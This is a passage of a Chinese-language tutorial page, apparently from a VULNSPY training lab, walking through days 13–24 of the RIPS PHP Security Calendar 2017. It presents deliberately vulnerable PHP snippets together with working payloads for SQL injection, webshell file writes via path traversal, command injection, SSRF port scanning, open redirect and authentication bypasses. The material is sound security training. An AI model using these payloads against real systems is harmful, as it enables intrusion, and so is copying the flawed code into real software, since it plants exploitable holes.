+        $queryBuilder = $this-&gt;em-&gt;createQueryBuilder()
+            -&gt;select("COUNT(p)")
+            -&gt;from("User", "u")
+            -&gt;where("user = '$user' AND password = '$pass'");
+        $query = $queryBuilder-&gt;getQuery();
+        return boolval($query-&gt;getSingleScalarResult());
+    }
+
+    public function sanitizeInput($input, $length = 20) {
+        $input = addslashes($input);
+        if (strlen($input) &gt; $length) {
+            $input = substr($input, 0, $length);
+        }
+        return $input;
+    }
+}
+
+$auth = new LoginManager($_POST['user'], $_POST['passwd']);
+if (!$auth-&gt;isValid()) {
+    exit;
+}</code></pre>
+<p>这是一道典型的用户登录的代码，但是本题目的漏洞和阶段注入的漏洞类似。在进行了<code>addslashes</code>之后进行了截断，在一些情况下就有可能能够获得一个引号。如下：</p>
+<pre><code class="language-PHP">function sanitizeInput($input, $length = 20) {
+    $input = addslashes($input);
+    if (strlen($input) &gt; $length) {
+        $input = substr($input, 0, $length);
+    }
+    return $input;
+}
+$test = "1234567890123456789'";
+var_dump(sanitizeInput($test));</code></pre>
+<p>最终得到的就是<code>1234567890123456789\</code>，这样就能够逃逸出一个<code>\</code>。在本题中，利用这个逃逸出的单引号，我们就能够绕过验证。
+那么我们最终的payload就可以写为如下：</p>
+<pre><code>user=1234567890123456789'&amp;passwd=or 1=1#</code></pre>
+<p>那么此时进入到数据库查选的SQL语句是<code>select count(p) from user u where user = '1234567890123456789\' AND password = 'or 1=1#'</code>。在此SQL语句中，user值为<code>1234567890123456789\' AND password =</code>。这样就能够保证返回的结果是True，如此就能够顺利地通过验证。</p>
+<h3>Day 14 - Snowman</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">class Carrot {
+    const EXTERNAL_DIRECTORY = '/tmp/';
+    private $id;
+    private $lost = 0;
+    private $bought = 0;
+
+    public function __construct($input) {
+        $this-&gt;id = rand(1, 1000);
+
+        foreach ($input as $field =&gt; $count) {
+            $this-&gt;$field = $count++;
+        }
+    }
+
+    public function __destruct() {
+        file_put_contents(
+            self::EXTERNAL_DIRECTORY . $this-&gt;id,
+            var_export(get_object_vars($this), true)
+        );
+    }
+}
+
+$carrot = new Carrot($_GET);</code></pre>
+<p>这道题目的危害是任意文件写，可以导致getshell。这到题目的问题有：</p>
+<ol>
+<li><code>foreach ($input as $field =&gt; $count) {$this-&gt;$field = $count++;}</code>存在变量覆盖漏洞；</li>
+<li><code>var_export(get_object_vars($this), true)</code>不会进行1任何的转义。</li>
+</ol>
+<p>在说明这个题目之前，先看看php中的<code>++</code>的行为：</p>
+<pre><code class="language-PHP">$test=123; echo $test++;  # 123</code></pre>
+<p>所以，如果变量直接自增，则结果是不会发生变化的。如果在题目中的<code>$count++</code>并不会对结果有任何的改变。同时<code>$this-&gt;$field</code>我们可以对<code>Carrot</code>实例的任何属性进行修改。例如我们的payload为<code>id=../../var/www/html/shell.php</code>,最后就能够覆盖到原先的变量的值，最终就能向<code>/var/ww/html/shell.php</code>进行写入了。</p>
+<p>第二个问题是如何写入shell。这个问题也十分的简单。通过<code>var_export(get_object_vars($this), true)</code>会获取示例的所有的属性，那么我们就可以构造属性进行写入。例如我们利用PHP中的<code>"</code>能够执行代码的特点，构造如<code>"&lt;?php phpinfo();&gt;"</code>，我们的payload如下：</p>
+<pre><code class="language-URL">id=../../var/www/html/test/shell.php&amp;t1=1%22%3C%3Fphp%20phpinfo%28%29%3F%3E%224</code></pre>
+<p>当程序运行至<code>__destruct</code>时：</p>
+<ol>
+<li><code>self::EXTERNAL_DIRECTORY . $this-&gt;id</code>变为<code>/tmp/../../var/www/html/test/shell.php</code></li>
+<li><code>var_export(get_object_vars($this), true)</code>变为
+<pre><code class="language-PHP">array (
+'id' =&gt; '../../var/www/html/test/shell.php',
+'lost' =&gt; 0,
+'bought' =&gt; 0,
+'t1' =&gt; '1"&lt;?php phpinfo()?&gt;"4',
+)</code></pre>
+<p>当这样就顺利地在<code>test/shell.php</code>下写入了webshell。</p></li>
+</ol>
+<p><strong>其他</strong></p>
+<p>本题目的很大问题是在于其中<code>$count++</code>并不会对结果有任何的影响，但是如果是<code>++$count</code>呢？</p>
+<pre><code>$test = 123; echo ++$test;      // 124
+$test = '123'; echo ++$test;    // 124
+$test = '1ab'; echo ++$test;    // '1ac'
+$test = 'ab1'; echo ++$test;    // 'ab2'
+$test = 'a1b'; echo ++$test;    // 'a1c'
+$test =array(2,'name'=&gt;'wyj'); echo ++$test;    //Array123</code></pre>
+<p>通过分析发现，在进行<code>++</code>操作时会进行隐式类型转换，如果能够转换成功，则会进行加法操作；如果不能转换成功，则将最后一个字符进行加法操作。</p>
+<p>如果本题的代码修改为:</p>
+<pre><code class="language-PHP">foreach ($input as $field =&gt; $count) {
+    $this-&gt;$field = ++$count;
+}</code></pre>
+<p>那么我们的payload就可以有以下的方式:</p>
+<ol>
+<li><code>id=../../var/www/html/test/shell.php4&amp;t1=1%22%3C%3Fphp%20phpinfo%28%29%3F%3E%224</code>，使用<code>php4</code>进行自增操作之后变为<code>php5</code>仍然能够执行。</li>
+<li><code>id=../../var/www/html/test/shell.pho&amp;t1=1%22%3C%3Fphp%20phpinfo%28%29%3F%3E%224</code>,<code>pho</code>进过自增操作之后就会变为<code>php</code></li>
+</ol>
+<h3>Day 15 - Sleigh Ride</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">class Redirect {
+    private $websiteHost = 'www.vulnspy.com';
+
+    private function setHeaders($url) {
+        $url = urldecode($url);
+        header("Location: $url");
+    }
+
+    public function startRedirect($params) {
+        $parts = explode('/', $_SERVER['PHP_SELF']);
+        $baseFile = end($parts);
+        $url = sprintf(
+            "%s?%s",
+            $baseFile,
+            http_build_query($params)
+        );
+        $this-&gt;setHeaders($url);
+    }
+}
+
+if ($_GET['redirect']) {
+    (new Redirect())-&gt;startRedirect($_GET['params']);
+}</code></pre>
+<p>本题目是一个任意路径跳转漏洞，题目本意是跳转至本网站的其他路径但是由于存在漏洞却可以跳转至任意其他的网站。题目的代码意思是取<code>$_SERVER['PHP_SELF']</code>中最后的一个路径与参数中的<code>params</code>值进行拼接，得到最终的跳转路径。</p>
+<p>对于拼接得到的URL还使用了<code>$url = urldecode($url);</code>进行解码操作。那么我们就需要对我们的URL<code>www.vulnspy.com</code>进行二次编码。那么不编码或者是编码一次可以吗？</p>
+<ol>
+<li>如果不编码呢，<code>index.php/http://www.vulnspy.com?redirect=1</code>,那么通过<code>$baseFile = end($parts);</code>得到是<code>www.vulnspy.com</code>,最后拼接的URL是<code>www.vulnspy.com?</code>,这样最终跳转的路径是<code>header('www.vulnspy.com?')</code>，还是在本网站内。所以如果需要跳转至其他的网站就必须带上<code>http</code>.</li>
+<li>如果是一次编码呢？<code>index.php/http%3A%2f%2fwww.vulnspy.com?redirect=1</code>,会出现<code>The requested URL /day15.php/http://www.vulnspy.com was not found on this server.</code>的错误。</li>
+</ol>
+<p><strong>关于这两者为什么会存在差异，目前还不是很清楚</strong></p>
+<p>进行二次编码之后，<code>index.php/http%253A%252f%252fwww.vulnspy.com?redirect=1</code>,经过<code>$baseFile = end($parts);</code>得到的就是<code>http%3A%2f%2fwww.vulnspy.com</code>。最后进入到<code>$url = urldecode($url);header("Location: $url");</code>，最终跳转的目录就是<code>http://www.vulnspy.com?</code>,这样就可以完成任意网站的跳转了。</p>
+<h3>Day 16 - Poem</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">class FTP {
+    public $sock;
+
+    public function __construct($host, $port, $user, $pass) {
+        $this-&gt;sock = fsockopen($host, $port);
+
+        $this-&gt;login($user, $pass);
+        $this-&gt;cleanInput();
+        $this-&gt;mode($_REQUEST['mode']);
+        $this-&gt;send($_FILES['file']);
+    }
+
+    private function cleanInput() {
+        array_filter($_GET, 'intval');
+        array_filter($_POST, 'intval');
+        array_filter($_COOKIE, 'intval');
+    }
+
+    public function login($username, $password) {
+        fwrite($this-&gt;sock, "USER " . $username);
+        fwrite($this-&gt;sock, "PASS " . $password);
+    }
+
+    public function mode($mode) {
+        if ($mode == 1 || $mode == 2 || $mode == 3) {
+            fputs($this-&gt;sock, "MODE $mode");
+        }
+    }
+
+    public function send($data) {
+        fputs($this-&gt;sock, $data);
+    }
+}
+
+new FTP('localhost', 21, 'user', 'password');</code></pre>
+<p>这到题目存在两个漏洞，分别是出自于<code>$_REQUEST</code>以及<code>==</code>的问题。首先说明<code>$_REQUEST</code>的问题，根据php手册上面的说明：</p>
+<blockquote>
+<p>由于 $_REQUEST 中的变量通过 GET，POST 和 COOKIE 输入机制传递给脚本文件，因此可以被远程用户篡改而并不可信。</p>
+</blockquote>
+<p>这话是什么意思呢?表示的是<code>$_REQUEST</code>是直接从GET，POST 和 COOKIE中取值，不是他们的引用。即使后续<code>GET，POST 和 COOKIE</code>发生了变化，也不会影响<code>$_REQUEST</code>的结果。如下:</p>
+<pre><code class="language-PHP">$_GET = array_map('intval', $_GET);
+var_dump($_GET);
+var_dump($_REQUEST);</code></pre>
+<p>访问U<code>index.php?t1=1abc</code>
+得到的结果如下：</p>
+<pre><code>test.php:2:
+array (size=1)
+  't1' =&gt; int 1
+
+test.php:3:
+array (size=1)
+  't1' =&gt; string '1abc' (length=4)</code></pre>
+<p>可以看到虽然<code>$_GET</code>发生了变化，但是<code>$_REQUEST</code>仍然是没有变化的。那么在本题中可以看到虽然前面使用了<code>cleanInput()</code>进行过滤，但是后面取值时又从<code>$_REQUEST</code>中取值，那么这也就表示之前的<code>cleanInput()</code>是无用的。</p>
+<p>之后的问题是在于<code>mode()</code>函数，其中仅仅只是使用了<code>==</code>。<code>==</code>的问题是在于进行比较时会进行隐式类型转换，如<code>1=='1ab'</code>就是相等的。那么在本题中我们就可以利用<code>$_REQUEST</code>和<code>==</code>的这两个特性造成任意文件删除的操作。最后的payload为:<code>1%0a%0dDELETE%20test.file</code>。</p>
+<h3>Day 17 - Mistletoe</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">class RealSecureLoginManager {
+    private $em;
+    private $user;
+    private $password;
+
+    public function __construct($user, $password) {
+        $this-&gt;em = DoctrineManager::getEntityManager();
+        $this-&gt;user = $user;
+        $this-&gt;password = $password;
+    }
+
+    public function isValid() {
+        $pass = md5($this-&gt;password, true);
+        $user = $this-&gt;sanitizeInput($this-&gt;user);
+
+        $queryBuilder = $this-&gt;em-&gt;createQueryBuilder()
+            -&gt;select("COUNT(p)")
+            -&gt;from("User", "u")
+            -&gt;where("password = '$pass' AND user = '$user'");
+        $query = $queryBuilder-&gt;getQuery();
+        return boolval($query-&gt;getSingleScalarResult());
+    }
+
+    public function sanitizeInput($input) {
+        return addslashes($input);
+    }
+}
+
+$auth = new RealSecureLoginManager(
+    $_POST['user'],
+    $_POST['passwd']
+);
+if (!$auth-&gt;isValid()) {
+    exit;
+}</code></pre>
+<p>这道题目是第13题的升级版本，我们知道在13题中主要是利用了<code>addslashes</code>和字符串截断的方式所造成的<code>\</code>逃逸从而形成的注入。本题最终的目的还是形成SQL注入从而进行任意账户登录。本题的关键问题是在于<code>md5($this-&gt;password, true);</code>。php手册中对于<code>flag</code>的说明如下：</p>
+<blockquote>
+<p>如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</p>
+</blockquote>
+<p>以一个例子进行说明:</p>
+<pre><code class="language-PHP">var_dump(md5('1'));             # c4ca4238a0b923820dcc509a6f75849b
+var_dump(md5('1',True));        # ��B8��#��P�ou��</code></pre>
+<p>设置了<code>true</code>之后就会和预期的输出有所差异。如果我们能够保证最后经过<code>md5($this-&gt;password, true);</code>最后的字符串是<code>\</code>，那么最后的sql语句就是<code>select count(p) from user s where password='xxxxxx\' and user='payload#'</code>，此时我们只需要设置好user的值就可以完成注入了。通过fuzz，我们发现<code>md5(128,true)</code>得到的是<code>v�an���l���q��\</code>。这种问题之前在CTF中也偶尔可以见到。</p>
+<p>最后我们的payload可以写为<code>passwd=128&amp;user=' or 1%23</code></p>
+<h3>Day 18 - Sign</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">class JWT {
+    public function verifyToken($data, $signature) {
+        $pub = openssl_pkey_get_public("file://pub_key.pem");
+        $signature = base64_decode($signature);
+        if (openssl_verify($data, $signature, $pub)) {
+            $object = json_decode(base64_decode($data));
+            $this-&gt;loginAsUser($object);
+        }
+    }
+}
+
+(new JWT())-&gt;verifyToken($_GET['d'], $_GET['s']);</code></pre>
+<p>本题目的问题是在于<code>openssl_verify()</code>的错误使用，根据php手册说明</p>
+<blockquote>
+<p>Returns 1 if the signature is correct, 0 if it is incorrect, and -1 on error</p>
+</blockquote>
+<p>在错误的情况下会返回<code>-1</code>。但是在<code>if</code>判断中得到的结果是True，if判断只有遇到<code>0</code>或者是<code>false</code>返回的才是<code>false</code>。所以如果能够使得<code>openssl_verify()</code>出错返回<code>-1</code>就能够绕过验证。</p>
+<p>如果让<code>openssl_verify()</code>出错呢？我们使用一个其他的<code>pub_key.pem</code>来生成<code>data</code>和<code>signature</code>,这样就可以使得<code>openssl_verify()</code>返回-1。在本题中既然已经知道了<code>openssl_verify()</code>返回结果，我们可以使用<code>if(openssl_verify()===1)</code>来避免被绕过。</p>
+<h3>Day 19 - Birch</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">class ImageViewer {
+    private $file;
+
+    function __construct($file) {
+        $this-&gt;file = "images/$file";
+        $this-&gt;createThumbnail();
+    }
+
+    function createThumbnail() {
+        $e = stripcslashes(
+            preg_replace(
+                '/[^0-9\\\]/',
+                '',
+                isset($_GET['size']) ? $_GET['size'] : '25'
+            )
+        );
+        system("/usr/bin/convert {$this-&gt;file} --resize $e
+                ./thumbs/{$this-&gt;file}");
+    }
+
+    function __toString() {
+        return "&lt;a href={$this-&gt;file}&gt;
+                &lt;img src=./thumbs/{$this-&gt;file}&gt;&lt;/a&gt;";
+    }
+}
+
+echo (new ImageViewer("image.png"));</code></pre>
+<p>本题的关键是在于<code>stripcslashes</code>函数。查看php手册中的说明:</p>
+<blockquote>
+<p>返回反转义后的字符串。可识别类似 C 语言的 \n，\r，... 八进制以及十六进制的描述。</p>
+</blockquote>
+<p>在PHP中还有一个类似的函数<code>stripslashes</code>。查看php手册中的说明：</p>
+<blockquote>
+<p>反引用一个引用字符串。</p>
+</blockquote>
+<p>所以这两者之间的差别是在于<code>stripcslashes</code>和<code>stripslashes</code>在于，<code>stripcslashes</code>会转义C语言以及十进制和8进制。通过下面的例子来说明：</p>
+<pre><code class="language-PHP">var_dump(stripslashes('0\073\163\154\145\145\160\0405\073'));       // 0�73163154145145160�405�73
+var_dump(stripcslashes('0\073\163\154\145\145\160\0405\073'));      // 0;sleep 5;</code></pre>
+<p>因为使用<code>stripcslashes</code>之后，会将<code>\163</code>就会解析八进制的<code>163</code>,得到的就是<code>s</code>。</p>
+<p>回到本题中，<code>[^0-9\\\]</code>因为着我们仅仅只能使用数字和<code>\</code>。在这种情况下很难输入命令造成命令执行。但是同时<code>stripcslashes</code>刚好可以解析八进制，而八进制全部都是数字，所以在这种情况下我们还是能够进行命令注入。我们将我们需要的命令转换为八进制进行输出就可以进行注入。</p>
+<p>例如命令<code>0;sleep 5;</code>,转换成为八进制就是<code>0\073\163\154\145\145\160\0405\073</code>,那么最终能够执行的命令就是：</p>
+<pre><code>/usr/bin/convert images/image.png --resize 0;sleep 5; ./thumbs/image.png</code></pre>
+<h3>Day 20 - Stocking</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">set_error_handler(function ($no, $str, $file, $line) {
+    throw new ErrorException($str, 0, $no, $file, $line);
+}, E_ALL);
+
+class ImageLoader
+{
+    public function getResult($uri)
+    {
+        if (!filter_var($uri, FILTER_VALIDATE_URL)) {
+            return '&lt;p&gt;Please enter valid uri&lt;/p&gt;';
+        }
+
+        try {
+            $image = file_get_contents($uri);
+            $path = "./images/" . uniqid() . '.jpg';
+            file_put_contents($path, $image);
+            if (mime_content_type($path) !== 'image/jpeg') {
+                unlink($path);
+                return '&lt;p&gt;Only .jpg files allowed&lt;/p&gt;';
+            }
+        } catch (Exception $e) {
+            return '&lt;p&gt;There was an error: ' .
+                $e-&gt;getMessage() . '&lt;/p&gt;';
+        }
+
+        return '&lt;img src="' . $path . '" width="100"/&gt;';
+    }
+}
+
+echo (new ImageLoader())-&gt;getResult($_GET['img']);</code></pre>
+<p>本题目的是问题是在于提供了错误显示，这样就导致可以根据错误信息推断服务器上面的信息，类似于MYSQL中的报错注入。而在本题中则是存在一个SSRF漏洞。分析代码，在代码的最前方有：<code>set_error_handler(function ($no, $str, $file, $line) { throw new ErrorException($str, 0, $no, $file, $line);}, E_ALL);</code>这个就类似于设置如下的代码：<code>error_reporting(E_ALL);ini_set('display_errors', TRUE);ini_set('display_startup_errors', TRUE);</code>，如此就会包含所有的错误信息。</p>
+<p>错误的显示配置加上<code>'&lt;p&gt;There was an error: ' .$e-&gt;getMessage() . '&lt;/p&gt;'</code>就导致会在页面上显示所有的信息，包括warning信息。</p>
+<p>正常情况下，如果使用<code>file_get_contents('http://127.0.0.1:80')</code>显示的仅仅只是<code>warning信息</code>，在正常的PHP页面中是不会显示warning信息的。但是在开启了上述的配置之后，所有的信息都会在页面上显示。这样就导致我们可以通过SSRF来探测内网的端口和服务了。例如：</p>
+<ol>
+<li>payload可以写为:<code>img=http://127.0.0.1:22</code>，如果出现了<code>There was an error: file_get_contents(http://127.0.0.1:22): failed to open stream: HTTP request failed! SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2</code>，则表示存在openssh的服务。</li>
+<li>payload为<code>img=http://127.0.0.1:25</code>,如果出现了<code>There was an error: file_get_contents(http://127.0.0.1:25): failed to open stream: HTTP request failed! 220 ubuntu ESMTP Sendmail 8.15.2/8.15.2/Debian-3; Tue, 26 Dec 2017 07:43:45 -0800; (No UCE/UBE) logging access from: localhost</code>则表示存在SMTP。</li>
+<li>如果通过payload访问不存在的端口,<code>img=http://127.0.0.1:30</code>，出现了<code>There was an error: file_get_contents(http://127.0.0.1:30): failed to open stream: Connection refused</code>，则表明30端口没有服务。</li>
+</ol>
+<p>所以通过这种方式就能够有效地探测内网端口服务了。</p>
+<h3>Day 21 - Gift Wrap</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">declare(strict_types=1);
+
+class ParamExtractor {
+    private $validIndices = [];
+
+    private function indices($input) {
+        $validate = function (int $value, $key) {
+            if ($value &gt; 0) {
+                $this-&gt;validIndices[] = $key;
+            }
+        };
+
+        try {
+            array_walk($input, $validate, 0);
+        } catch (TypeError $error) {
+            echo "Only numbers are allowed as input";
+        }
+
+        return $this-&gt;validIndices;
+    }
+
+    public function getCommand($parameters) {
+        $indices = $this-&gt;indices($parameters);
+        $params = [];
+        foreach ($indices as $index) {
+            $params[] = $parameters[$index];
+        }
+        return implode($params, ' ');
+    }
+}
+
+$cmd = (new ParamExtractor())-&gt;getCommand($_GET['p']);
+system('resizeImg image.png ' . $cmd);</code></pre>
+<p>这是一道在运行在php7上的题目，题目本上的考察点比较少见，主要是利用了<code>array_walk()</code>的一个bug。php是一个弱类型的语言，在传入参数时并不会进行类型检查，甚至有时候还会进行隐式类型转换，很多时候由于开发人员的疏忽就会导致漏洞产生。在php7中就引入了<code>declare(strict_types=1);</code>这种声明方式，在进行函数调用的时候会进行参数类型检查。如果参数类型不匹配则函数不会被调用，这种方式就和诸如Java这类强类型的语言就是一样的了。如下：</p>
+<pre><code class="language-PHP">declare(strict_types=1);
+function addnum(int $a,int $b) {
+    return $a+$b;
+}
+$result = addnum(1,2);
+var_dump($result);              // 输出3
+$result = addnum('1','2');
+var_dump($result);              //出现Fatal error: Uncaught TypeError，Argument 1 passed to addnum() must be of the type integer, string given,程序出错，参数的数据类型不匹配</code></pre>
+<p>按照php7的这种类型，那么最后通过<code>validate()</code>函数的就只有参数是大于0的，这样看来本题目是没有问题的。但是本题的关键是在于使用了<code>array_walk()</code>来调用<code>validate</code>函数。<strong>通过<code>array_walk()</code>调用的函数会忽略掉严格模式还是按照之前的php的类型转换的方式调用函数。</strong>。如下：</p>
+<pre><code class="language-PHP">declare(strict_types=1);
+function addnum(int &amp;$value) {
+    $value = $value+1;
+}
+$input = array('3a','4b');
+array_walk($input,addnum);
+var_dump($input);</code></pre>
+<p>最后得到的input数组是<code>array(4,5)</code>,所以说明了在使用<code>array_walk()</code>会忽略掉类型检查。</p>
+<p>那么在本题目中，由于<code>array_walk()</code>的这种特性，导致我们可以传入任意字符进去，从而也可以造成命令执行了。最后的payload可以是<code>?p[1]=1&amp;p[2]=2;%20ls%20-la</code>。</p>
+<h3>Day 22 - Chimney</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">if (isset($_POST['password'])) {
+    setcookie('hash', md5($_POST['password']));
+    header("Refresh: 0");
+    exit;
+}
+
+$password = '0e836584205638841937695747769655';
+if (!isset($_COOKIE['hash'])) {
+    echo '&lt;form&gt;&lt;input type="password" name="password" /&gt;'
+       . '&lt;input type="submit" value="Login" &gt;&lt;/form &gt;';
+    exit;
+} elseif (md5($_COOKIE['hash']) == $password) {
+    echo 'Login succeeded';
+} else {
+    echo 'Login failed';
+}
+</code></pre>
+<p>这道题目在各大CTF训练题中进场会见到，算是一道比较简单的题目。在本题中考察点有两个：</p>
+<ol>
+<li><code>$_COOKIE</code>中的内容是客户端可控的</li>
+<li>在php中以<code>0e数字</code>这样形式的变量会被以科学计数法的方式进行解析，如<code>$mytext1 = "0e23456";$mytext2 = "0e789";var_dump($mytext1==$mytext2);</code>返回是<code>true</code></li>
+</ol>
+<p>在本题目中，进行比较运算的是<code>md5($_COOKIE['hash']) == $password</code>，其中的$password是<code>0e836584205638841937695747769655</code>。所以只需要找一个<code>md5()</code>之后是<code>0es数字</code>形式的即可，例如hash为<code>s878926199a</code>就满足要求。</p>
+<p>所以最后的payload是<code>Cookie:hash=s878926199a</code>。</p>
+<h3>Day 23 - Cookies</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">class LDAPAuthenticator {
+    public $conn;
+    public $host;
+
+    function __construct($host = "localhost") {
+        $this-&gt;host = $host;
+    }
+
+    function authenticate($user, $pass) {
+        $result = [];
+        $this-&gt;conn = ldap_connect($this-&gt;host);    
+        ldap_set_option(
+            $this-&gt;conn,
+            LDAP_OPT_PROTOCOL_VERSION,
+            3
+        );
+        if (!@ldap_bind($this-&gt;conn))
+            return -1;
+        $user = ldap_escape($user, null, LDAP_ESCAPE_DN);
+        $pass = ldap_escape($pass, null, LDAP_ESCAPE_DN);
+        $result = ldap_search(
+            $this-&gt;conn,
+            "",
+            "(&amp;(uid=$user)(userPassword=$pass))"
+        );
+        $result = ldap_get_entries($this-&gt;conn, $result);
+        return ($result["count"] &gt; 0 ? 1 : 0);
+    }
+}
+
+if(isset($_GET["u"]) &amp;&amp; isset($_GET["p"])) {
+    $ldap = new LDAPAuthenticator();
+    if ($ldap-&gt;authenticate($_GET["u"], $_GET["p"])) {
+        echo "You are now logged in!";
+    } else {
+        echo "Username or password unknown!";
+    }
+}</code></pre>
+<p>本题主要是ldap的登录验证的代码，但是由于过滤函数使用不当而导致的任意用户登录的漏洞。</p>
+<p>在题目中使用的过滤函数是<code>ldap_escape($user, null, LDAP_ESCAPE_DN)</code>。php手册上对第三个参数的说明如下：</p>
+<blockquote>
+<p>The context the escaped string will be used in: LDAP_ESCAPE_FILTER for filters to be used with ldap_search(), or LDAP_ESCAPE_DN for DNs</p>
+</blockquote>
+<p>当使用<code>ldap_search()</code>时需要选择<code>LDAP_ESCAPE_FILTER</code>过滤字符串，但是本题中选择的是<code>LDAP_ESCAPE_DN</code>，这样就导致过滤无效。那么最后通过传入<code>u=*&amp;p=123456</code>这种方式就可以绕过验证。</p>
+<h3>Day 24 - Nutcracker</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">@$GLOBALS=$GLOBALS{next}=next($GLOBALS{'GLOBALS'})
+[$GLOBALS['next']['next']=next($GLOBALS)['GLOBALS']]
+[$next['GLOBALS']=next($GLOBALS[GLOBALS]['GLOBALS'])
+[$next['next']]][$next['GLOBALS']=next($next['GLOBALS'])]
+[$GLOBALS[next]['next']($GLOBALS['next']{'GLOBALS'})]=
+next(neXt(${'next'}['next']));</code></pre>
+<p>这道题目是<code>Hack.lu CTF 2014: Next Global Backdoor</code>上的一道题目，具体的解答可以看<a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/next-global-backdoor">Hack.lu CTF 2014: Next Global Backdoor</a>，也有一篇中文文章的介绍<a href="http://drops.xmd5.com/static/drops/tips-3420.html">Hack.lu 2014 Writeup</a></p>
+<p>这里就不进行详细的说明了，大家有兴趣可以自行研究。但是这种写法也仅仅只会出现在CTF中，在实际的项目中很少会出现这样的代码。</p>
+<h3>REFERENCE</h3>
+<ul>
+<li><a href="https://github.com/bl4de/security_whitepapers/blob/master/RIPS_PHP_Security_Calendar_2017.md">bl4de/security_whitepapers</a></li>
+<li><a href="https://www.ripstech.com/php-security-calendar-2017/">PHP SECURITY CALENDAR 2017</a></li>
+<li><a href="https://blog.ripstech.com/2017/php-security-advent-calendar/">PHP Security Advent Calendar 2017 Announcement</a></li>
+<li><a href="https://github.com/spoock1024/CTF-Practice/blob/830069f31248dcefe7eb5df02233843763ab955a/PHP%20SECURITY%20CALENDAR%202017/README_CN.md">spoock1024/CTF-Practice/PHP SECURITY CALENDAR 2017/README_CN.md</a></li>
+</ul></div>
+	</div>
+	<div class="sidebar">
+		<div class="sth-btn">
+			<a id="sth" target="_blank" href="https://www.vsplate.com/?github=vulnspy/ripstech-php-security-calendar-2017&amp;autogo=1">start to hack</a>
+			<p id="demo-notice">Click the button and start the playing.</p>
+		</div>
+		<ul>
+			<li href="#" class="nlink selected"># TOP</li>
+		</ul>
+	</div>
+</div>
+<script>
+if(lang == 'cn'){
+	$("#demo-notice").html("点击上方按钮开启实验.");
+}
+$(document).ready(function(){
+
+$.extend({
+	genMenu: function() {
+		var html = '';
+		var prevH = 'h0';
+		var toClose = 0;
+		$(".content").children("h1,h2,h3,h4,h5").each(function(i,e){
+			var tagName = $(e)[0].tagName.toLowerCase();
+			//var menuName = 'M-'+window.btoa($(e).text());
+			var menuName = 'M-'+randomString(6)+'-'+$(e).text().replace(/\ +/g,"-");
+			$(e).attr('id',menuName);
+			if(tagName > prevH){
+				html = html+'<ul>';
+				html = html+'<li class="menu-item nlink" href="#'+$.escapeHtml(menuName)+'">'+$.escapeHtml($(e).text())+'</li>';
+				toClose = toClose + 1;
+			}else if(tagName == prevH){
+				html = html+'<li class="menu-item nlink" href="#'+$.escapeHtml(menuName)+'">'+$.escapeHtml($(e).text())+'</li>';
+			}else if(tagName < prevH){
+				html = html+'</ul>';
+				html = html+'<li class="menu-item nlink" href="#'+$.escapeHtml(menuName)+'">'+$.escapeHtml($(e).text())+'</li>';
+				toClose = toClose - 1;
+			}
+			prevH = tagName;
+		});
+		while(toClose > 0){
+			html = html+'</ul>';
+			toClose = toClose - 1;
+		}
+		$(".sidebar ul").remove();
+		$(".sidebar").append(html);
+		$(".sidebar ul:first").prepend('<li class="menu-item nlink selected" href="#"># TOP</li>');
+		return html;
+	}
+});
+$.extend({
+	selectMenu: function() {
+		var mintoTop = 20;
+		var menu = [];
+		$("li.menu-item").each(function(i,e){
+			id = $(e);
+			if(id && id != '#'){
+				menu.push(id);
+			}
+		});
+		for(var i=menu.length;i>0;i--){
+			mid = menu[i-1].attr('href');
+			var toTop = $(mid).offset().top-$(document).scrollTop();
+			if(toTop <= mintoTop){
+				$("li.menu-item").removeClass('selected');
+				menu[i-1].addClass('selected');
+				break;
+			}
+		}
+		return mid;
+	}
+});
+$.extend({
+	fixSidebar: function() {
+		var sidebarTop = $(".sidebar").offset().top-$(document).scrollTop();
+		if($(document).scrollTop() < 120){
+			$(".sidebar").css("margin-top", "20px");
+		}else if(sidebarTop < 20){
+			$(".sidebar").css("margin-top", ($(document).scrollTop()-80)+"px");
+		}else if(sidebarTop > 20 && $(document).scrollTop() > 120){
+			$(".sidebar").css("margin-top", ($(document).scrollTop()-80)+"px");
+		}
+	}
+});
+$.genMenu();
+$(window).scroll(function(){
+	$.fixSidebar();
+	$.selectMenu();
+});
+
+});
+</script>
+<div style="float:left;width:100%;text-align:center;margin-top:5em;background: #000;color: #FFF;">
+	<div style="margin:0 auto;width:95%;max-width:90em;padding:1em 0;">All rights reserved. &copy; 2018 VULNSPY</div>
+</div>
+<script>
+$(function () {
+	$("pre code").closest("pre").addClass("line-numbers ");
+});
+</script>
+<script src="/js/prism.js"></script>
+</body>
+</html>
